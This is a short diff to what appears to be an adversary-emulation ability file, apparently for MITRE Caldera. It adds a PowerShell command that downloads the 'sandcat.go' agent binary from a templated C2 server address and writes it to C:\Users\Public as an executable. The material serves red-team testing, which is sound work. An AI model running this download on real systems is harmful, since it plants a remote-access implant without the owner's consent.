@@ -10,6 +10,11 @@
     windows:
       psh:
         command: |
-          ;
-        payloads:
-          - sandcat.go-windows
+          $server="#{server}";
+          $url="$server/file/download";
+          $wc=New-Object System.Net.WebClient;
+          $wc.Headers.add("platform","windows");
+          $wc.Headers.add("file","sandcat.go");
+          $data=$wc.DownloadData($url);
+          $name="sandcat.go-windows";
+          [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;
